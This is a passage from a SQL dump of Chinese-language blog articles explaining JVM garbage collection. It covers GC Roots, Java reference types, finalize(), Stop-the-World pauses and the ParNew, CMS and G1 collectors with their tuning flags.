}\n}\n上面的代码在一个方法中创建了一个对象，然后有一个局部变量引用了这个对象，这种情况是最常见的。\nmain()方法的栈帧入栈，然后调用initData()方法，栈帧入栈。\n接着让局部变量dataManager引用堆内存里的DataManager实例对象。\n\n假设现在上图中DataManager对象被局部变量给引用了，那么此时一旦新生代快满了。\n就会发生垃圾回收，会去分析这个DataManager对象的可达性。\n这时如果发现他是不能被回收的，因为他被人引用了，而且是被局部变量\"dataManager\"引用的。\n在JVM规范中,局部变量就是可以作为GC Roots的。\n只要一个对象被局部变量引用了，那么就说明他有一个GC Roots，此时就不能被回收了。\n```\n#### 被类静态属性引用\n![JVM垃圾回收根搜索算法被静态属性引用.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626525483_JVM-垃圾回收-根搜索算法-被静态属性引用.png)\n```java\n// 被类静态属性引用\npublic class Hello {\n	public static DataManager dataManager = new DataManager();\n}\n垃圾回收分析发现这个DataManager对象被Hello类的一个静态变量\"dataManager\"给引用了\n在JVM的规范里，静态变量也可以看做是一种GC Roots,，只要一个对象被GC Roots引用了，就不会去回收他。\n\n```\n### 对象的内存状态和不同引用类型\n#### 内存状态\n```java\n// 对象在内存中的状态\n(1) 可达状态\n(2) 可恢复状态\n(3) 不可达状态\n\n// 可达状态\n(1) 当一个对象被创建后，有一个以上的引用变量引用它\n(2) 在GCRoots中可以从起始顶点导航到该对象，那么它就处于可达状态\n(3) 程序可以通过引用变量来调用该对象的属性和方法\n\n// 可恢复状态\n(1) 某个对象不再有任何引用变量引用它，它先进入可恢复状态\n(2) 此时从GCRoots的起始顶点导航不能导航到该对象\n(3) 在这种状态下，系统的垃圾回收机制准备回收该对象所占用的内存\n(4) 在回收该对象之前，系统会调用可恢复状态对象的finalize方法进行资源管理\n(5) 如果系统调用finalize方法重新让一个以上的引用变量引用该对象\n(6) 则这个对象会再次变为可达状态，否则，该对象将进入不可达状态\n\n// 不可达状态\n(1) 当对象的所有关联都被切断，且系统调用所有兑现过的finalize方法依然没有使该对象变成可达状态后\n(2) 这个对象将永久性地失去引用，最后变成不可达状态\n(3) 只有当一个对象处于不可达状态时，系统才会真正回收该对象所占用的资源\n\n```\n#### 不同引用类型\n```java\nJava里有不同的引用类型。\n分别是强引用、软引用、弱引用和虚引用。\n下面分别用代码来示范一下。\n\n// 强引用\npublic class Hello {\n	public static DataManager dataManager = new DataManager();\n}\n这个就是最普通的代码，一个变量引用一个对象。\n只要是强引用的类型，那么垃圾回收的时候绝对不会去回收这个对象的。\n\n// 软引用\npublic class Hello {\n	public static SoftReference<DataManager> dataManager = new SoftReference<DataManager>(new DataManager());\n}\n就是把DataManager实例对象用一个\"SoftReference\"软引用类型的对象给包裹起来了，此时这个\"dataManager\"变量对DataManager对象的引用就是软引用了。\n正常情况下垃圾回收是不会回收软引用对象的，但是如果你进行垃圾回收之后，发现内存空间还是不够存放新的对象，内存都快溢出了。\n此时就会把这些软引用对象给回收掉，哪怕他被变量引用了，但是因为他是软引用，所以还是要回收。\n\n// 弱引用\npublic class Hello {\n	public static WeakReference<DataManager> dataManager = new WeakReference<DataManager>(new DataManager());\n}\n这个弱引用就跟没引用是类似的，如果发生垃圾回收，就会把这个对象回收掉。\n\n比较常用的是强引用和弱引用，强引用代表绝对不能回收的对象，软引用就是说对象可有可无，如果内存实在不够了，可以回收他。\n\n// 引用方式生产环境为强引用,引用方式只需了解,因为硬件的发展所以其他引用变得没有用武之地\n// 强引用\n(1) 这是最常见的引用，程序创建一个对象，并把这个对象赋给一个引用变量，这个引用变量就是强引用\n(2) 强引用是Java编程中广泛使用的引用类型，被强引用所引用的Java对象绝不会被垃圾回收机制回收\n(3) 即使系统内存非常紧张，即使用有些Java对象以后永远不会被用到，jvm也不会回收被强引用所引用的Java对象\n(4) 由于jvm肯定不会回收被强引用的所引用的Java对象，因此强引用是造成Java内存泄露的主要原因之一\n\n// 软引用\n(1) 软引用需要通过SoftReference类来实现\n(2) 当一个对象只具有软引用时，它有可能被垃圾回收机制回收\n(3) 当系统内存空间足够时，它不会被系统回收，程序可以使用该对象\n(4) 当系统内存不足时，系统将会回收它\n(5) 软引用通常用于内存敏感的程序中，软引用是强引用很好的替代\n(6) 如果系统堆内存空间紧张，那么使用软引用是一种较好的方案\n(7) 可提高程序运行效率，避免垃圾回收\n\n// 弱引用\n(1) 弱引用通过过WeakReference、WeakHashMap类实现\n(2) 弱引用具有很大的不确定性，因为每次垃圾回收机制执行时都会回收弱引用所引用的对象\n(3) 获取弱引用所引用的对象时，必须小心空指针异常\n(4) 弱引用所引用的对象生存期更短\n(5) 与软引用类似，但引用级别更低\n(6) 对于只有弱引用对象，当系统垃圾回收机制运行时\n(7) 无论系统内存是否足够，总会回收该对象所占用的内存\n\n// 虚引用\n(1) 虚引用不能单独使用，必须和引用队列联合使用\n(2) 虚引用通过PhantomReference类实现，它完全类似于没有引用\n(3) 虚引用对对象本身没有太大影响，对象只有一个虚引用，那么它和没有引用的效果大致相同\n(4) 主要作用是跟踪对象被垃圾回收的状态，系统无法通过虚引用来获得被引用的对象\n(5) 引用队列由ReferenceQueue类来表示，它用于保存被回收后对象的引用\n(6) 当把软引用、弱引用和引用队列联合使用时，系统回收对象时，将把被回收对象的引用添加到关联的引用队列中\n(7) 虚引用在对象被释放之前就已经把引用添加到引用队列当中，这使得可以在对象被回收之前采取行动\n(8) 程序通过检查与虚引用关联的引用队列中是否已经包含指定的虚引用，从而了解引用所引用的对象是否即将被回收\n\n```\n#### finalize()方法的作用\n```java\n有GC Roots引用的对象不能回收，没有GC Roots引用的对象可以回收。\n如果有GC Roots引用，但是如果是软引用或者弱引用的，也有可能被回收掉。\n在回收环节,假设没有GC Roots引用的对象，是一定立马被回收吗?\n其实不是的，有一个finalize()方法可以拯救他自己，看下面的代码。\npublic class DataManager {\n	public static DataManager instance;\n	@Override\n	protected void finalize() {\n		DataManager.instance = this;\n	}\n}\n假设有一个ReplicaManager对象要被垃圾回收了，那么假如这个对象重写了Object类中的finialize()方法\n此时会先尝试调用一下他的finalize()方法，看是否把自己这个实例对象给了某个GC Roots变量。\n比如说代码中就给了ReplicaManager类的静态变量。\n如果重新让某个GC Roots变量引用了自己，那么就不用被垃圾回收了。\n```\n#### 常见问题\n```java\n// 垃圾回收\n(1) 简单说就是内存中已经不再被使用的内存空间就是垃圾\n(2) 不定时去堆内存中清理不可达对象。不可达的对象并不会马上就会直接回收,垃圾收集器在一个Java程序中的执行是自动的,不能强制执行,即使程序员能明确地判断出有一块内存已经无用了,是应该回收的.程序员也不能强制垃圾收集器回收该内存块。\n(3) 程序员唯一能做的就是通过调用System.gc 方法来\"建议\"执行垃圾收集器,但其是否可以执行.什么时候执行却都是不可知的。这也是垃圾收集器的最主要的缺点。当然相对于它给程序员带来的巨大方便性而言.这个缺点是瑕不掩瑜的。\n\n// system.gc()是什么\n提示给gc进行回收垃圾,但是不表示立即进行回收\n\n// 什么是不可达对象\n没有被继续引用,与GCRoots无依赖关系\n\n// 判断是否垃圾的步骤\n(1) 根搜素算法判断不可用\n(2) 看是否有必要执行finalize方法\n(3) 两个步骤走完后对应对象仍然没有人使用,那就属于垃圾\n\n// finalize方法是什么\n垃圾回收机制之前进行执行的事件钩子,它是在Object类中定义的\n\n// 判断类无用的条件\n(1) JVM中该类的所有实例都已经被回收\n(2) 加载该类的ClassLoader已经被回收\n(3) 没有任何地方引用该类的Class\n(4) 无法在任何地方通过反射访问这个类\n```', 0, 0, 131, 0, 0, '2020-12-22 18:29:32', '2020-12-26 18:29:32', 0, 0);
INSERT INTO `article` VALUES (107, 1, 'JVM的StopTheWorld与垃圾回收器', '2021/5/1621254287_mmexport1621059174364.jpg', '### Stop the World\n#### 新生代的GC\n![JVM垃圾回收垃圾回收器进行MinorGC.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626599418_JVM-垃圾回收-垃圾回收器进行MinorGC.png)\n```java\n新生代的内存是分为Eden和两个Survivor的。\n如果系统不停的运行，然后把Eden给塞满了。\n这个时候势必就会触发Minor GC了。\n进行垃圾回收是有专门的垃圾回收线程的，而且对不同的内存区域会有不同的垃圾回收器。\n相当于垃圾回收线程和垃圾回收器配合起来，使用自己的垃圾回收算法，对指定的内存区域进行垃圾回收。\n垃圾回收一定会通过一个后台运行的垃圾回收线程来执行他具体的一个逻辑。\n比如针对新生代会用ParNew垃圾回收器来进行回收，ParNew垃圾回收器针对新生代采用的就是复制算法来垃圾回收。\n垃圾回收器会把Eden区中的存活对象都标记出来，然后全部转移到Survivor1去，接着一次性清空掉Eden中的垃圾对象。\n接着系统继续运行，新的对象继续分配在Eden中。\n当Eden再次塞满的时候，就又要触发Minor GC了，此时已然是垃圾回收线程运行垃圾回收器中的算法逻辑，也就是采用复制算法逻辑，去标记出来Eden和Survivor1中的存活对象。\n然后一次性把存活对象转移到Survivor2中去，接着把Eden和Survivor1中的垃圾对象都回收掉。\n\n```\n#### GC时不能继续创建新的对象\n![JVM垃圾回收MinorGC时创建对象.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626599418_JVM-垃圾回收-MinorGC时创建对象.png)\n```java\n假设允许在GC期间，然后还可以继续让系统在新生代的Eden区里创建新的对象，会是一个什么样的场景。\n如果垃圾回收器在把Eden和Survivor2里的存活对象标记出来转移到Survivor1去，然后还在把Eden和Survivor2里的垃圾对象都清理掉。\n结果这个时候系统程序还在不停的在Eden里创建新的对象。\n这些新的对象有的很快就成了垃圾对象，有的还有人引用是存活对象。\n全部乱套了，对于程序新创建的这些对象。\n怎么让垃圾回收器去持续追踪这些新对象的状态？\n怎么想办法在这次垃圾回收的过程中把新对象中的那些存活对象转移到Survivor2中去？\n怎么想办法把新创建的对象中的垃圾都给回收了？\n所以说，在垃圾回收的过程中，同时还允许Java系统继续不停的运行在Eden里持续创建新的对象，目前来看是非常不合适的一个事情。\n\n```\n#### Stop The World\n![JVM垃圾回收StopTheWorld.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626599419_JVM-垃圾回收-StopTheWorld.png)\n```java\n平时使用JVM最大的痛点，其实就是在垃圾回收的这个过程。\n因为在垃圾回收的时候，尽可能要让垃圾回收器专心致志的干工作，不能随便让Java系统继续对象了。\n所以此时JVM会在后台直接进入\"Stop the World\"状态。\n也就是说，会直接停止Java系统的所有工作线程，让我们写的代码不再运行。\n\n这样垃圾回收线程可以专心致志的进行垃圾回收的工作。\n会让系统暂停运行，不再创建新的对象，同时让垃圾回收线程尽快完成垃圾回收的工作。\n比如新生代的回收就是标记和转移Eden以及Survivor2的存活对象到Survivor1中去，然后尽快一次性回收掉Eden和Survivor2中的垃圾对象。\n接着一旦垃圾回收完毕，就可以继续恢复Java系统的工作线程的运行，然后我们写的代码就可以继续运行，继续在Eden中创建新的对象。\n```\n#### Stop the World造成的系统停顿\n```java\n假设Minor GC要运行100ms，那么可能就会导致我们的系统直接停顿100ms不能处理任何请求。\n在这100ms期间用户发起的所有请求都会出现短暂的卡顿，因为系统的工作线程不在运行，不能处理请求。\n假设你开发的是一个Web系统，你的用户从网页或者APP上点击一个按钮平时只要几十ms就可以返回响应。\n现在因为你的Web系统的JVM正在执行Minor GC，暂停了所有的工作线程，导致你的请求过来到响应返回，这次需要等待几百毫秒。\n因为内存分配不合理，导致对象频繁进入老年代，平均七八分钟一次Full GC。\nFull GC是最慢的，有的时候弄不好一次回收要进行几秒钟，甚至几十秒，有的极端场景几分钟都是有可能的。\n\n此时一旦频繁的Full GC，你的系统可能每隔七八分钟就卡死个30秒。\n在30秒内任何用户的请求全部卡死无法处理，用户看到的都是系统超时之类的提示，这会让用户体验极差,这是无法接受的。\n所以说无论是新生代GC还是老年代GC，都尽量不要让频率过高，也避免持续时间过长，避免影响系统正常运行，这也是使用JVM过程中一个最需要优化的地方，也是最大的一个痛点。\n```\n### 新生代垃圾回收器：ParNew\n![JVM垃圾回收ParNew.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626594277_JVM-垃圾回收-ParNew.png)\n#### ParNew\n```java\n通常运行在服务器上的Java系统，都可以充分利用服务器的多核CPU的优势。\n假设你的服务器是4核CPU，如果对新生代垃圾回收的时候，仅仅使用单线程进行垃圾回收，会导致没法充分利用CPU资源。\n在垃圾回收的时候，会把系统程序所有的工作线程全部停掉了，如果就一个垃圾回收线程在运行。\n那么此时4核CPU的资源根本没法充分利用，理论上4核CPU就可以支持4个垃圾回收线程并行执行，可以提升4倍的性能。\n新生代的ParNew垃圾回收器主打的就是多线程垃圾回收机制。\n另外一种Serial垃圾回收器主打的是单线程垃圾回收机制。\n他们俩都是回收新生代的，唯一的区别就是单线程和多线程的区别，但是垃圾回收算法是完全一样的。\nParNew垃圾回收器如果一旦在合适的时机执行Minor GC的时候，就会把系统程序的工作线程全部停掉。\n禁止程序继续运行创建新的对象，然后自己就用多个垃圾回收线程去进行垃圾回收。\n\n```\n#### 如何使用ParNew\n```java\n部署到Tomcat时可以在Tomcat的catalina.sh中设置Tomcat的JVM参数，使用Spring Boot也可以在启动时指定JVM参数。\n使用\"-XX:+UseParNewGC\"选项，只要加入这个选项，JVM启动之后对新生代的回收就是使用ParNew垃圾回收器。\n```\n#### ParNew默认情况下的线程数量\n```java\n一般部署系统的服务器都是多核CPU的，所以为了在垃圾回收的时候充分利用多核CPU的资源。\n一旦指定了使用ParNew垃圾回收器之后，默认设置的垃圾回收线程的数量就是跟CPU的核数是一样的。\n比如线上机器假设用的是4核CPU，或者8核CPU，或者16核CPU。\n那么此时ParNew的垃圾回收线程数就会分别是4个线程、8个线程、16个线程\n这个东西一般不用我们手动去调节，因为跟CPU核数一样的线程数量，是可以充分进行并行处理的。\n如果你一定要自己调节ParNew的垃圾回收线程数量，使用\"-XX:ParallelGCThreads\"参数，通过他可以设置线程的数量。\n但是建议一般不要随意动这个参数，如果要优化,尽量采用其他方式。\n```\n### 老年代垃圾回收器：CMS\n#### CMS使用标记清理算法\n![JVM垃圾回收标记清理导致的内存碎片.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626599071_JVM-垃圾回收-标记清理导致的内存碎片.png)\n```java\n每次垃圾回收之后，存活对象都进入Survivor区，然后下一次垃圾回收后的存活对象都进入另外一个Survivor区。\n很少很少的对象会进入老年代里去，也就几乎不太会触发老年代的垃圾回收了。\n但是真实情况是线上系统很可能就会因为各种各样的情况，导致很多对象进入老年代，然后甚至频繁触发老年代的Full GC。\n一般老年代选择的垃圾回收器是CMS，他采用的是标记清理算法。\n标记方法去标记出哪些对象是垃圾对象，然后就把这些垃圾对象清理掉。\n\n假设老年代内存空间小于了历次Minor GC后升入老年代对象的平均大小,判断Minor GC有风险，可能就会提前触发Full GC回收老年代的垃圾对象。\n或者是一次Minor GC后的对象太多了，都要升入老年代，发现空间不足，触发了一次老年代的Full GC。\n总之就是要进行Full GC了，此时所谓的标记-清理算法会先通过追踪GC Roots的方法，看看各个对象是否被GC Roots给引用了，如果是的话，那就是存活对象，否则就是垃圾对象。\n先将垃圾对象都标记出来，然后一次性把垃圾对象都回收掉。\n这种方法最大的问题就是会造成很多\"内存碎片\"。\n这些内存碎片不大不小的，可能放不下任何一个对象，那么这个内存就被浪费了。\n这就是CMS采取的\"标记-清理\"算法。\n\n```\n#### 如果先Stop the World后垃圾回收会如何\n```java\n假设先\"Stop the World\"，然后再采用\"标记-清理算法\"去回收垃圾。\n那么将会停止一切工作线程，然后慢慢的去执行\"标记-清理算法\"，会导致系统卡死时间过长，很多响应无法处理。\n所以CMS垃圾回收器采取的是\"垃圾回收线程和系统工作线程尽量同时执行的模式来处理的\"。\n\n```\n#### CMS如何实现系统一边工作的同时进行垃圾回收\n```java\nCMS在执行一次垃圾回收的过程一共分为4个阶段：\n(1) 初始标记\n(2) 并发标记\n(3) 重新标记\n(4) 并发清理\n```\n#### 初始标记\n![JVM垃圾回收CMS初始标记.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626601526_JVM-垃圾回收-CMS-初始标记.png)\n```java\n// 初始标记\nCMS要进行垃圾回收时，会先执行初始标记阶段.\n这个阶段会让系统的工作线程全部停止，进入\"Stop the World\"状态。\n\"初始标记\"就是标记出来所有GC Roots直接引用的对象。\n比如下面的代码\npublic void Hello {\n	private static DataManagaer dataManager = new DataManager();\n}\npublic void DataManager {\n	private DataFetcher dataFetcher = new DataFetcher();\n}\n在初始标记阶段，仅仅会通过\"dataManager\"这个类的静态变量代表的GC Roots，去标记出来他直接引用的DataManager对象，这就是初始标记的过程。\n但他不会去管DataFetcher这种对象，因为DataFetcher对象是被DataManager类的\"dataManager\"实例变量引用的。\n因为方法的局部变量和类的静态变量是GC Roots。但是类的实例变量不是GC Roots。\n所以第一个阶段\"初始标记\"，虽说要造成\"Stop the World\"暂停一切工作线程。\n但是其实影响不大，因为他的速度很快，仅仅标记GC Roots直接引用的那些对象罢了。\n```\n#### 并发标记\n![JVM垃圾回收CMS并发标记.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626601526_JVM-垃圾回收-CMS-并发标记.png)\n```java\n接着第二个阶段是\"并发标记\"，这个阶段会让系统线程可以随意创建各种新对象，继续运行。\n在运行期间可能会创建新的存活对象，也可能会让部分存活对象失去引用，变成垃圾对象。\n在这个过程中，垃圾回收线程，会尽可能的对已有的对象进行GC Roots追踪。\n所谓进行GC Roots追踪，意思就是对类似\"DataFetcher\"之类的全部老年代里的对象去看他被谁引用了。\n比如这里是被\"DataManagaer\"对象的实例变量引用了。\n于是接着会看\"DataManagaer\"对象被谁引用了,会发现被\"Hello\"类的静态变量引用了。\n那么此时可以认定\"DataFetcher\"对象是被GC Roots间接引用的，所以此时就不需要回收他。\n但是这个过程中，在进行并发标记的时候，系统程序会不停的工作，他可能会各种创建出来新的对象，部分对象可能成为垃圾。\n第二个阶段，就是对老年代所有对象进行GC Roots追踪，其实是最耗时的。\n他需要追踪所有对象是否从根源上被GC Roots引用了。\n但是这个最耗时的阶段是跟系统程序并发运行的，所以其实这个阶段不会对系统运行造成影响的。\n```\n#### 重新标记\n![JVM垃圾回收CMS重新标记.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626601526_JVM-垃圾回收-CMS-重新标记.png)\n```java\n因为第二阶段里,一边标记存活对象和垃圾对象,一边系统在不停运行创建新对象，让老对象变成垃圾。\n所以第二阶段结束之后，绝对会有很多存活对象和垃圾对象，是之前第二阶段没标记出来的。\n所以此时进入第三阶段\"重新标记阶段\"，要继续让系统程序停下来，再次进入\"Stop the World\"状态。\n然后重新标记下在第二阶段里新创建的一些对象，还有一些已有对象可能失去引用变成垃圾的情况。\n这个重新标记的阶段是速度很快的，他其实就是对在第二阶段中被系统程序运行变动过的少数对象进行标记，所以运行速度很快。\n重新标记阶段结束后会重新恢复系统程序的运行,接着进入第四阶段。\n```\n#### 并发清理\n![JVM垃圾回收CMS并发清理.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626601526_JVM-垃圾回收-CMS-并发清理.png)\n```java\n这个阶段就是让系统程序随意运行，此时来清理掉之前标记为垃圾的对象即可。\n这个阶段其实是很耗时的，因为需要进行对象的清理。\n但是他是跟系统程序并发运行的，所以其实也不影响系统程序的执行。\n```\n#### 对CMS的垃圾回收机制进行性能分析\n```java\nCMS的垃圾回收机制已经尽可能的进行了性能优化了。\n最耗时的是\"并发标记\",对老年代全部对相关进行GC Roots追踪，标记出来到底哪些可以回收。\n还有\"并发清理\",对各种垃圾对象从内存里清理掉,这两个阶段是最耗时的。\n但是\"并发标记\"和\"并发清理\"，都是和系统程序并发执行的,所以这两个最耗时的阶段对性能影响不大。\n\n只有\"初始标记\"和\"重新标记\"是需要\"Stop the World\"的。\n但是这两个阶段都是简单的标记而已，速度非常的快，所以基本上对系统运行响应也不大。\n```\n#### 并发回收垃圾导致CPU资源紧张\n```java\nCMS垃圾回收器有一个最大的问题。\n并发标记和并发清理两个最耗时的阶段，垃圾回收线程和系统工作线程同时工作，会导致有限的CPU资源被垃圾回收线程占用了一部分。\n并发标记的时候，需要对GC Roots进行深度追踪，看所有对象里面到底有多少是存活的。\n但是因为老年代里存活对象是比较多的，这个过程会追踪大量的对象，所以耗时较高。\n并发清理又需要把垃圾对象从各种随机的内存位置清理掉，也是比较耗时的。\n所以在这两个阶段，CMS的垃圾回收线程是比较耗费CPU资源的。\nCMS默认启动的垃圾回收线程的数量是（CPU核数 + 3）/ 4。\n```\n#### Concurrent Mode Failure\n```java\n在并发清理阶段，CMS只不过是回收之前标记好的垃圾对象\n但是这个阶段系统一直在运行，可能会随着系统运行让一些对象进入老年代，同时还变成垃圾对象。\n这种对象，就是老年代的\"浮动垃圾\"。\n因为他虽然成为了垃圾，但是CMS只能回收之前标记出来的垃圾对象，不会回收他们，需要等到下一次GC的时候才会回收他们。\n所以为了保证在CMS垃圾回收期间，还有一定的内存空间让一些对象可以进入老年代，一般会预留一些空间。\nCMS垃圾回收的触发时机，其中有一个就是当老年代内存占用达到一定比例了，就自动执行GC。\n\"-XX:CMSInitiatingOccupancyFaction\"参数可以用来设置老年代占用多少比例的时候触发CMS垃圾回收，JDK 1.6里面默认的值是92%。\n也就是说老年代占用了92%空间了，就自动进行CMS垃圾回收，预留8%的空间给并发回收期间，系统程序把一些新对象放入老年代中。\n\n那么如果CMS垃圾回收期间，系统程序要放入老年代的对象大于了可用内存空间。\n这个时候，会发生\"Concurrent Mode Failure\"，就是说并发垃圾回收失败了，我一边回收，你一边把对象放入老年代，内存都不够了。\n此时就会自动用\"Serial Old\"垃圾回收器替代CMS，就是直接强行把系统程序\"Stop the World\"，重新进行长时间的GC Roots追踪，标记出来全部垃圾对象，不允许新的对象产生。\n然后一次性把垃圾对象都回收掉，结束后再恢复系统线程。\n所以在生产实践中，这个自动触发CMS垃圾回收的比例需要合理优化一下，避免\"Concurrent Mode Failure\"问题。\n```\n#### 内存碎片问题\n```java\n老年代的CMS采用\"标记-清理\"算法，每次都是标记出来垃圾对象，然后一次性回收掉，这样会导致大量的内存碎片产生。\n如果内存碎片太多，会导致后续对象进入老年代找不到可用的连续内存空间了，然后触发Full GC。\n所以CMS不是完全就仅仅用\"标记-清理\"算法的，因为太多的内存碎片实际上会导致更加频繁的Full GC。\nCMS有一个参数\"-XX:+UseCMSCompactAtFullCollection\"，默认就打开了。\n这个参数的意思是在Full GC之后要再次进行\"Stop the World\"，停止工作线程，然后进行碎片整理，就是把存活对象挪到一起，空出来大片连续内存空间，避免内存碎片。\n\n还有一个参数是\"-XX:CMSFullGCsBeforeCompaction\"。\n这个参数意思是执行多少次Full GC之后再执行一次内存碎片整理的工作，默认是0。意思就是每次Full GC之后都会进行一次内存整理。\n```\n### 新生代与老年代都可使用的垃圾回收器: G1\n#### ParNew + CMS的组合痛点\n```java\n无论是新生代垃圾回收，还是老年代垃圾回收。\n都会或多或少产生\"Stop the World\"现象，对系统的运行是有一定影响的。\n所以其实之后对垃圾回收器的优化，都是朝着减少\"Stop the World\"的目标去做的。\n在这个基础之上，G1垃圾回收器就应运而生了，他可以提供比\"ParNew + CMS\"组合更好的垃圾回收的性能。\n```\n#### G1垃圾回收器\n![JVM垃圾回收G1的Region.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626613051_JVM-垃圾回收-G1的Region.png)\n```java\nG1垃圾回收器是可以同时回收新生代和老年代的对象。\n不需要两个垃圾回收器配合起来运作，他一个人就可以搞定所有的垃圾回收。\n他最大的一个特点，就是\"把Java堆内存拆分为多个大小相等的Region\"。\nG1也会有新生代和老年代的概念，但是只不过是\"逻辑上的概念\"。\n也就是说，新生代可能包含了某些Region，老年代可能包含了某些Reigon。\n\nG1最大的一个特点，就是可以让我们设置一个垃圾回收的预期停顿时间。\n也就是我们可以指定：\n希望G1在垃圾回收的时候可以保证，在1小时内由G1垃圾回收导致的\"Stop the World\"时间，也就是系统停顿的时间，不能超过1分钟。\n这个就很厉害了,直接可以给G1指定，在一个时间内，垃圾回收导致的系统停顿时间不能超过多久，G1全权给你负责，保证达到这个目标。\n这样相当于我们就可以直接控制垃圾回收对系统性能的影响了。\n```\n#### G1是如何做到对垃圾回收导致的系统停顿可控\n![JVM垃圾回收G1的Region回收价值.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626613051_JVM-垃圾回收-G1的Region-回收价值.png)\n```java\nG1如果要做到这一点，他就必须要追踪每个Region里的\"回收价值\"。\n他必须搞清楚每个Region里的对象有多少是垃圾，如果对这个Region进行垃圾回收，需要耗费多长时间，可以回收掉多少垃圾。\n\n比如如图，G1通过追踪发现，1个Region中的垃圾对象有10MB，回收他们需要耗费1000毫秒。\n另外一个Region中的垃圾对象有20MB，回收他们需要耗费200毫秒。\n垃圾回收时，G1会发现在最近一个时间段内，比如1小时内，垃圾回收已经导致了几百毫秒的系统停顿了。\n现在又要执行一次垃圾回收，那么必须是回收上图中那个只需要200ms就能回收掉20MB垃圾的Region。\n于是G1触发一次垃圾回收，虽然可能导致系统停顿了200ms，但是一下子回收了更多的垃圾，就是20MB的垃圾。\n\n简单来说，G1可以做到让你来设定垃圾回收对系统的影响。\n他自己通过把内存拆分为大量小Region，以及追踪每个Region中可以回收的对象大小和预估时间。\n最后在垃圾回收的时候，尽量把垃圾回收对系统造成的影响控制在你指定的时间范围内，同时在有限的时间内尽量回收尽可能多的垃圾对象。\n这就是G1的核心设计思路。\n```\n#### Region可能属于新生代也可能属于老年代\n```java\n在G1中，每一个Region可能属于新生代，但是也可能属于老年代的。\n刚开始的Region可能谁都不属于，过了段时间就分配给了新生代，然后放了很多属于新生代的对象。接着就触发了垃圾回收这个Region。\n然后下一次同一个Region可能被分配给老年代了，用来放老年代的长生存周期的对象。\n所以其实在G1对应的内存模型中，Region随时会属于新生代也会属于老年代，所以没有所谓新生代给多少内存，老年代给多少内存这么一说了。\n实际上新生代和老年代各自的内存区域是不停的变动的，由G1自动控制。\n```\n#### 如何设定G1对应的内存大小\n![JVM垃圾回收G1的Region大小.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626613051_JVM-垃圾回收-G1的Region大小.png)\n```java\nG1对应的是一大堆的Region内存区域，每个Region的大小是一致的。\n到底有多少个Region呢？每个Region的大小是多大呢？\n其实这个默认情况下是自动计算和设置的。\n我们可以给整个堆内存设置一个大小，比如说用\"-Xms\"和\"-Xmx\"来设置堆内存的大小。\n可以使用\"-XX:+UseG1GC\"来指定使用G1垃圾回收器。\nJVM启动时一旦发现你使用的是G1垃圾回收器，此时会自动用堆大小除以2048。\n因为JVM最多可以有2048个Region，Region的大小必须是2的倍数，比如说1MB、2MB、4MB之类的。\n比如堆大小是4G，那么就是4096MB，此时除以2048个Region，每个Region的大小就是2MB。\n如果通过手动方式来指定,参数是\"-XX:G1HeapRegionSize\"。\n\n刚开始时，默认新生代对堆内存的占比是5%，也就是占据200MB左右的内存，对应大概是100个Region。\n这个是可以通过\"-XX:G1NewSizePercent\"来设置新生代初始占比的，其实维持这个默认值即可。\n因为在系统运行中，JVM其实会不停的给新生代增加更多的Region，但是最多新生代的占比不会超过60%。\n可以通过\"-XX:G1MaxNewSizePercent\"来修改这个新生代的占比。\n```\n#### 新生代还有Eden和Survivor的概念\n![JVM垃圾回收G1的Region的Eden与Survivor.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626613051_JVM-垃圾回收-G1的Region的Eden与Survivor.png)\n```java\nG1中虽然把内存划分为了很多的 Region，但是其实还是有新生代、老年代的区分\n而且新生代里还是有Eden和Survivor的划分的。\n新生代的参数\"-XX:SurvivorRatio=8\"，在这里还是可以区分出来属于新生代的Region里哪些属于Eden，哪些属于Survivor。\n比如新生代之前说刚开始初始的时候，有100个Region，那么可能80个Region就是Eden，两个Survivor各自占10个Region。\n随着对象不停的在新生代里分配，属于新生代的Region会不断增加，Eden和Survivor对应的Region也会不断增加。\n```\n#### G1新生代的垃圾回收\n![JVM垃圾回收G1的新生代回收.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626613051_JVM-垃圾回收-G1的新生代回收.png)\n```java\nG1的新生代也有Eden和Survivor的区分，那么触发垃圾回收的机制都是类似的。\n随着不停的在新生代的Eden对应的Region中放对象，JVM就会不停的给新生代加入更多的Region，直到新生代占据堆大小的最大比例60%。\n一旦新生代达到了设定的占据堆内存的最大大小60%，比如都有1200个Region了。\n里面的Eden可能占据了1000个Region，每个Survivor是100个Region，而且Eden区还占满了对象。\n这个时候还是会触发新生代的GC，G1就会用复制算法来进行垃圾回收，进入一个\"Stop the World\"状态。\n然后把Eden对应的Region中的存活对象放入S1对应的Region中，接着回收掉Eden对应的Region中的垃圾对象。\n但是这个过程跟之前是有区别的，因为G1是可以设定目标GC停顿时间的。\nG1执行GC的时候最多可以让系统停顿多长时间，可以通过\"-XX:MaxGCPauseMills\"参数来设定，默认值是200ms。\n那么G1会通过对每个Region追踪回收他需要多少时间，可以回收多少对象来选择回收一部分的Region。\n保证GC停顿时间控制在指定范围内，尽可能多的回收掉一些对象。\n```\n#### 对象什么时候进入老年代\n```java\n在G1的内存模型下，新生代和老年代各自都会占据一定的Region，老年代也会有自己的Region。\n按照默认新生代最多只能占据堆内存60%的Region来推算，老年代最多可以占据40%的Region，大概就是800个左右的Region。\n\n对象什么时候从新生代进入老年代:\n(1) 对象在新生代躲过了很多次的垃圾回收，达到了一定的年龄了他就会进入老年代,\"-XX:MaxTenuringThreshold\"参数可以设置这个年龄，\n(2) 动态年龄判定规则，如果一旦发现某次新生代GC过后，存活对象大小超过了Survivor的50%。\n此时就会判断一下，比如年龄为1岁，2岁，3岁，4岁的对象的大小总和超过了Survivor的50%，此时4岁以上的对象全部会进入老年代，这就是动态年龄判定规则\n```\n#### 